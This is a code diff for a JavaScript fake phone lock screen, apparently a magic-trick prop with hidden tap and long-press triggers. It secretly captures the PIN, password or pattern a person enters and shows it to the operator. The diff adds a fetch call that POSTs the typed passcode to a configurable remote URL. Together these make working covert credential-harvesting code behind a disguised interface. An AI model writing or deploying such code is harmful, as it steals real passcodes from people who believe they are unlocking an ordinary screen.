@@ -1,175 +1,183 @@
-let config = { mode: "pin4", successAt: 1, peekAt: 1, url: "" };
 let attemptCount = 0;
+let forceSuccess = false;
 let currentInput = "";
 let peekData = null;
-let tapLog = 0;
-let lastTapTime = 0;
+let lastTap = 0;
+let holdTimer;
 
-// 1. Triple Tap Global Reset
-document.addEventListener('touchstart', (e) => {
-    let now = Date.now();
-    if (now - lastTapTime < 400) {
-        tapLog++;
-        if (tapLog === 3) location.reload();
-    } else {
-        tapLog = 1;
+const config = {
+    mode: "pin4",
+    successAt: 1,
+    peekAt: 1,
+    sendAt: 1,
+    url: "YOUR_URL_HERE"
+};
+
+window.onload = () => {
+    const saved = localStorage.getItem('lockscreen_settings');
+    if (saved) {
+        const data = JSON.parse(saved);
+        Object.assign(config, data);
+        document.getElementById('lock-type').value = config.mode;
+        document.getElementById('success-try').value = config.successAt;
+        document.getElementById('peek-try').value = config.peekAt;
+        document.getElementById('send-try').value = config.sendAt;
+        document.getElementById('script-url').value = config.url;
     }
-    lastTapTime = now;
-});
+    updateTime();
+    setInterval(updateTime, 10000);
+};
 
-// 2. Setup Initialization
 document.getElementById('start-app').addEventListener('click', () => {
     config.mode = document.getElementById('lock-type').value;
     config.successAt = parseInt(document.getElementById('success-try').value);
     config.peekAt = parseInt(document.getElementById('peek-try').value);
+    config.sendAt = parseInt(document.getElementById('send-try').value);
     config.url = document.getElementById('script-url').value;
     
+    localStorage.setItem('lockscreen_settings', JSON.stringify(config));
     document.getElementById('setup-page').classList.add('hidden');
     document.getElementById('lock-page').classList.remove('hidden');
-    
-    if (config.mode.includes('pin')) {
-        const count = config.mode === 'pin4' ? 4 : 6;
-        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(count);
-        document.getElementById('pin-dots').classList.remove('hidden');
-        document.getElementById('keypad').classList.remove('hidden');
-    } else if (config.mode === 'password') {
-        document.getElementById('password-wrapper').classList.remove('hidden');
-        document.getElementById('pass-field').focus();
-    } else {
-        document.getElementById('pattern-canvas').classList.remove('hidden');
-        initPattern();
-    }
+    initLockMode();
 });
 
-// 3. Input Handling
-document.querySelectorAll('.key').forEach(el => {
-    el.addEventListener('touchstart', (e) => {
-        e.preventDefault(); // Prevents ghost clicks
-        let val = el.getAttribute('data-val');
-        currentInput += val;
-        
-        let dots = document.querySelectorAll('.dot');
-        if (dots[currentInput.length - 1]) dots[currentInput.length - 1].classList.add('filled');
-        
-        let limit = config.mode === 'pin4' ? 4 : 6;
-        if (currentInput.length === limit) {
-            setTimeout(() => processPass(currentInput), 250);
+function initLockMode() {
+    if (config.mode.includes('pin')) {
+        const dots = config.mode === 'pin4' ? 4 : 6;
+        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dots);
+        document.getElementById('pin-dots').classList.remove('hidden');
+        document.getElementById('pin-pad').classList.remove('hidden');
+    } else if (config.mode === 'password') {
+        document.getElementById('password-tap-zone').classList.remove('hidden');
+        const input = document.getElementById('hidden-pass-input');
+        input.addEventListener('keydown', (e) => { if(e.key === 'Enter') processEntry(input.value); });
+    } else {
+        document.getElementById('pattern-canvas').classList.remove('hidden');
+        drawDots(); 
+    }
+}
+
+// Secret Trigger Logic (Both Lock and Home)
+const triggers = ['secret-trigger-lock', 'secret-trigger-home'];
+triggers.forEach(id => {
+    const el = document.getElementById(id);
+    const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
+    
+    el.addEventListener('contextmenu', e => e.preventDefault());
+    el.addEventListener('touchstart', e => {
+        const now = Date.now();
+        if (now - lastTap < 300) {
+            forceSuccess = !forceSuccess;
+            navigator.vibrate(20);
+            document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
         }
+        lastTap = now;
+        holdTimer = setTimeout(() => {
+            drawPeek(peekEl);
+            document.getElementById(peekEl).classList.remove('hidden');
+        }, 1500);
+    });
+    el.addEventListener('touchend', () => {
+        clearTimeout(holdTimer);
+        document.getElementById(peekEl).classList.add('hidden');
     });
 });
 
-document.getElementById('pass-field').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') processPass(e.target.value);
+// Pattern Drawing Logic
+const canvas = document.getElementById('pattern-canvas');
+const ctx = canvas.getContext('2d');
+const dots = [];
+let currentPattern = [];
+for (let i = 0; i < 3; i++) for (let j = 0; j < 3; j++) dots.push({ x: j * 100 + 50, y: i * 100 + 50, id: i * 3 + j });
+
+function drawDots() {
+    ctx.clearRect(0, 0, 300, 300);
+    ctx.strokeStyle = "white"; ctx.lineWidth = 4;
+    if (currentPattern.length > 0) {
+        ctx.beginPath();
+        ctx.moveTo(dots[currentPattern[0]].x, dots[currentPattern[0]].y);
+        currentPattern.forEach(id => ctx.lineTo(dots[id].x, dots[id].y));
+        ctx.stroke();
+    }
+    dots.forEach(d => {
+        ctx.beginPath(); ctx.arc(d.x, d.y, 10, 0, Math.PI*2);
+        ctx.fillStyle = currentPattern.includes(d.id) ? "white" : "rgba(255,255,255,0.3)";
+        ctx.fill();
+    });
+}
+
+canvas.addEventListener('touchmove', (e) => {
+    const rect = canvas.getBoundingClientRect();
+    const x = e.touches[0].clientX - rect.left;
+    const y = e.touches[0].clientY - rect.top;
+    dots.forEach(d => {
+        if(Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 30 && !currentPattern.includes(d.id)) {
+            currentPattern.push(d.id);
+            navigator.vibrate(10);
+        }
+    });
+    drawDots();
 });
 
-function processPass(val) {
+canvas.addEventListener('touchend', () => {
+    if(currentPattern.length > 1) processEntry(currentPattern.join('-'), true);
+    currentPattern = []; drawDots();
+});
+
+// Core Processing
+function processEntry(val, isPattern = false) {
     attemptCount++;
-    if (attemptCount === config.peekAt) peekData = val;
-    
-    if (attemptCount === config.successAt) {
+    if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
+    if (!isPattern && attemptCount === config.sendAt && config.url) {
+        fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
+    }
+
+    if (attemptCount === config.successAt || forceSuccess) {
+        document.getElementById('unlock-sound').play();
         document.getElementById('lock-page').classList.add('hidden');
         document.getElementById('home-page').classList.remove('hidden');
     } else {
-        // Fail Animation
-        navigator.vibrate(100);
+        document.getElementById('lock-content').classList.add('shake');
+        navigator.vibrate([50, 50, 50]);
+        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
         currentInput = "";
         document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
-        document.getElementById('pass-field').value = "";
+        document.getElementById('hidden-pass-input').value = "";
     }
 }
 
-// 4. Peek Logic (1 Second)
-['lock-trigger', 'home-trigger'].forEach(id => {
-    let timer;
-    const trigger = document.getElementById(id);
-    const canvasId = id.includes('lock') ? 'peek-lock' : 'peek-home';
-    
-    trigger.addEventListener('touchstart', () => {
-        timer = setTimeout(() => {
-            renderPeek(canvasId);
-            document.getElementById(canvasId).classList.remove('hidden');
-        }, 1000);
-    });
-    trigger.addEventListener('touchend', () => {
-        clearTimeout(timer);
-        document.getElementById(canvasId).classList.add('hidden');
+document.querySelectorAll('.num').forEach(btn => {
+    btn.addEventListener('click', () => {
+        currentInput += btn.innerText;
+        const dot = document.querySelectorAll('.dot')[currentInput.length - 1];
+        if (dot) dot.classList.add('filled');
+        const limit = config.mode === 'pin4' ? 4 : 6;
+        if (currentInput.length === limit) setTimeout(() => processEntry(currentInput), 200);
     });
 });
 
-function renderPeek(id) {
-    const ctx = document.getElementById(id).getContext('2d');
-    ctx.clearRect(0,0,100,100);
+function drawPeek(targetCanvasId) {
+    const pCanvas = document.getElementById(targetCanvasId);
+    const pCtx = pCanvas.getContext('2d');
+    pCtx.clearRect(0, 0, 80, 80);
     if (!peekData) return;
-    
-    ctx.fillStyle = "white";
-    ctx.strokeStyle = "white";
-    
-    if (typeof peekData === 'string' && !peekData.includes('-')) {
-        ctx.font = "bold 22px Arial";
-        ctx.fillText(peekData, 10, 50);
-    } else {
-        // Draw pattern with direction indicators
-        let path = Array.isArray(peekData) ? peekData : peekData.split('-').map(Number);
-        ctx.lineWidth = 2; ctx.beginPath();
-        path.forEach((dot, i) => {
-            let x = (dot % 3) * 30 + 20; let y = Math.floor(dot/3) * 30 + 20;
-            if(i === 0) ctx.moveTo(x,y); else ctx.lineTo(x,y);
-            ctx.fillRect(x-2, y-2, 4, 4); // Dot for position
+
+    pCtx.fillStyle = "white";
+    if (Array.isArray(peekData)) {
+        pCtx.strokeStyle = "white"; pCtx.lineWidth = 2;
+        pCtx.beginPath();
+        peekData.forEach((id, i) => {
+            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
+            if(i === 0) pCtx.moveTo(x,y); else pCtx.lineTo(x,y);
         });
-        ctx.stroke();
+        pCtx.stroke();
+    } else {
+        pCtx.font = "bold 18px Arial"; pCtx.fillText(peekData, 10, 45);
     }
 }
 
-// 5. Pattern Logic
-function initPattern() {
-    const canvas = document.getElementById('pattern-canvas');
-    const pCtx = canvas.getContext('2d');
-    const pDots = [];
-    let path = [];
-    for (let i = 0; i < 3; i++) for (let j = 0; j < 3; j++) pDots.push({ x: j*100+50, y: i*100+50, id: i*3+j });
-    
-    const draw = () => {
-        pCtx.clearRect(0,0,300,300);
-        pCtx.strokeStyle = "white"; pCtx.lineWidth = 4;
-        if (path.length > 0) {
-            pCtx.beginPath();
-            pCtx.moveTo(pDots[path[0]].x, pDots[path[0]].y);
-            path.forEach(id => pCtx.lineTo(pDots[id].x, pDots[id].y));
-            pCtx.stroke();
-        }
-        pDots.forEach(d => {
-            pCtx.beginPath(); pCtx.arc(d.x, d.y, 8, 0, Math.PI*2);
-            pCtx.fillStyle = path.includes(d.id) ? "white" : "rgba(255,255,255,0.3)";
-            pCtx.fill();
-        });
-    };
-    
-    canvas.addEventListener('touchmove', (e) => {
-        let rect = canvas.getBoundingClientRect();
-        let x = e.touches[0].clientX - rect.left;
-        let y = e.touches[0].clientY - rect.top;
-        pDots.forEach(d => {
-            if (Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 30 && !path.includes(d.id)) {
-                path.push(d.id);
-                navigator.vibrate(10);
-                draw();
-            }
-        });
-    });
-    
-    canvas.addEventListener('touchend', () => {
-        if (path.length > 1) {
-            peekData = [...path];
-            processPass(path.join('-'));
-        }
-        path = []; draw();
-    });
-    draw();
-}
-
 function updateTime() {
-    let now = new Date();
-    document.getElementById('clock').innerText = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
+    const now = new Date();
+    const timeStr = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
+    document.querySelector('.clock').innerText = timeStr;
 }
-setInterval(updateTime, 1000);
-updateTime();
